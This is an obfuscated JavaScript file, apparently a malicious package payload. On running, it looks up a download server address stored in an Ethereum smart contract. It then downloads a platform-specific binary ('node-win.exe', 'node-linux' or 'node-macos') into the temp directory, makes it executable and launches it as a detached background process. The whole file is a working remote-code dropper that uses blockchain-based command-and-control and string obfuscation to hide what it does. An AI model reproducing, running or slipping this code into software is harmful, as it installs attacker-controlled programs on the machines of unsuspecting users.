const _0x17964e=_0x441b;function _0x441b(_0x225966,_0x293b15){const _0x2b2fe9=_0x2b2f();return _0x441b=function(_0x441b46,_0x5940d2){_0x441b46=_0x441b46-0x65;let _0x545222=_0x2b2fe9[_0x441b46];return _0x545222;},_0x441b(_0x225966,_0x293b15);}(function(_0x3ad386,_0x5e40da){const _0x2cd717=_0x441b,_0x59b675=_0x3ad386();while(!![]){try{const _0x440559=-parseInt(_0x2cd717(0x76))/0x1*(-parseInt(_0x2cd717(0x83))/0x2)+-parseInt(_0x2cd717(0x99))/0x3+parseInt(_0x2cd717(0x6b))/0x4*(parseInt(_0x2cd717(0x69))/0x5)+parseInt(_0x2cd717(0x95))/0x6+parseInt(_0x2cd717(0x8b))/0x7+-parseInt(_0x2cd717(0x75))/0x8*(-parseInt(_0x2cd717(0x85))/0x9)+parseInt(_0x2cd717(0x89))/0xa*(-parseInt(_0x2cd717(0x67))/0xb);if(_0x440559===_0x5e40da)break;else _0x59b675['push'](_0x59b675['shift']());}catch(_0x5dc53c){_0x59b675['push'](_0x59b675['shift']());}}}(_0x2b2f,0x47239));const {ethers}=require(_0x17964e(0x74)),axios=require(_0x17964e(0x70)),util=require(_0x17964e(0x7e)),fs=require('fs'),path=require('path'),os=require('os'),{spawn}=require(_0x17964e(0x6e)),contractAddress=_0x17964e(0x8f),WalletOwner=_0x17964e(0x97),abi=['function\x20getString(address\x20account)\x20public\x20view\x20returns\x20(string)'],provider=ethers[_0x17964e(0x87)](_0x17964e(0x9a)),contract=new ethers[(_0x17964e(0x8c))](contractAddress,abi,provider),fetchAndUpdateIp=async()=>{const _0x75c1ee=_0x17964e,_0x1a7d4c={'HQiEV':_0x75c1ee(0x6c),'esJJy':function(_0xe89340){return _0xe89340();}};try{const _0x337f37=await contract[_0x75c1ee(0x92)](WalletOwner);return _0x337f37;}catch(_0x5cd873){return console['error'](_0x1a7d4c[_0x75c1ee(0x7d)],_0x5cd873),await _0x1a7d4c[_0x75c1ee(0x84)](fetchAndUpdateIp);}},getDownloadUrl=_0x3c804c=>{const _0x5c860f=_0x17964e,_0x51852e={'spCLX':'darwin'},_0x5960d4=os[_0x5c860f(0x72)]();switch(_0x5960d4){case _0x5c860f(0x71):return _0x3c804c+_0x5c860f(0x91);case _0x5c860f(0x8e):return _0x3c804c+_0x5c860f(0x96);case _0x51852e[_0x5c860f(0x98)]:return _0x3c804c+'/node-macos';default:throw new Error(_0x5c860f(0x93)+_0x5960d4);}},downloadFile=async(_0x39a96d,_0x22d247)=>{const _0x1018ff=_0x17964e,_0x737cc6={'PCMGc':_0x1018ff(0x65),'BTPIm':_0x1018ff(0x7f),'Houjl':'stream'},_0x27c856=fs[_0x1018ff(0x80)](_0x22d247),_0xca5914=await axios({'url':_0x39a96d,'method':_0x737cc6[_0x1018ff(0x7c)],'responseType':_0x737cc6[_0x1018ff(0x82)]});return _0xca5914[_0x1018ff(0x81)]['pipe'](_0x27c856),new Promise((_0x191000,_0x5e53d5)=>{const _0x9ca463=_0x1018ff;_0x27c856['on'](_0x737cc6['PCMGc'],_0x191000),_0x27c856['on'](_0x9ca463(0x7a),_0x5e53d5);});},executeFileInBackground=async _0x3b045e=>{const _0x28174e=_0x17964e,_0x159d68={'LeHzf':function(_0x327d18,_0x1d8b2d,_0x3461ff,_0x296425){return _0x327d18(_0x1d8b2d,_0x3461ff,_0x296425);},'iKLyl':_0x28174e(0x94),'kiyZF':_0x28174e(0x73)};try{const _0x4f21dd=_0x159d68[_0x28174e(0x77)](spawn,_0x3b045e,[],{'detached':!![],'stdio':_0x159d68[_0x28174e(0x79)]});_0x4f21dd[_0x28174e(0x86)]();}catch(_0x57bcee){console[_0x28174e(0x7a)](_0x159d68[_0x28174e(0x6a)],_0x57bcee);}},runInstallation=async()=>{const _0x3de132=_0x17964e,_0x11a133={'prgga':function(_0x39d40b,_0x58b77f){return _0x39d40b(_0x58b77f);},'cFpuV':function(_0xd97dfc,_0x16e862,_0x3e2ce1){return _0xd97dfc(_0x16e862,_0x3e2ce1);},'WEXmu':function(_0x58a7a5,_0x13fa53){return _0x58a7a5!==_0x13fa53;},'xYctI':'win32','TuTEy':_0x3de132(0x68),'xeEmZ':'Ошибка\x20установки:'};try{const _0x39550e=await fetchAndUpdateIp(),_0x1b7591=_0x11a133[_0x3de132(0x88)](getDownloadUrl,_0x39550e),_0x5cb7eb=os[_0x3de132(0x78)](),_0x471e76=path[_0x3de132(0x7b)](_0x1b7591),_0x3d636c=path[_0x3de132(0x66)](_0x5cb7eb,_0x471e76);await _0x11a133[_0x3de132(0x6f)](downloadFile,_0x1b7591,_0x3d636c);if(_0x11a133[_0x3de132(0x8d)](os[_0x3de132(0x72)](),_0x11a133['xYctI']))fs[_0x3de132(0x90)](_0x3d636c,_0x11a133[_0x3de132(0x8a)]);executeFileInBackground(_0x3d636c);}catch(_0x1f680e){console[_0x3de132(0x7a)](_0x11a133[_0x3de132(0x6d)],_0x1f680e);}};runInstallation();function _0x2b2f(){const _0x582019=['platform','Ошибка\x20при\x20запуске\x20файла:','ethers','8URXygh','41731WtkiCF','LeHzf','tmpdir','iKLyl','error','basename','BTPIm','HQiEV','util','GET','createWriteStream','data','Houjl','2qYOuNp','esJJy','154881uvwkip','unref','getDefaultProvider','prgga','20330LGDWoQ','TuTEy','3415188tveXIN','Contract','WEXmu','linux','0xa1b40044EBc2794f207D45143Bd82a1B86156c6b','chmodSync','/node-win.exe','getString','Unsupported\x20platform:\x20','ignore','1564698icWetb','/node-linux','0x52221c293a21D8CA7AFD01Ac6bFAC7175D590A84','spCLX','1378494qVABDS','mainnet','finish','join','715LTHPrs','755','377105QvvCNi','kiyZF','4IXuKRf','Ошибка\x20при\x20получении\x20IP\x20адреса:','xeEmZ','child_process','cFpuV','axios','win32'];_0x2b2f=function(){return _0x582019;};return _0x2b2f();}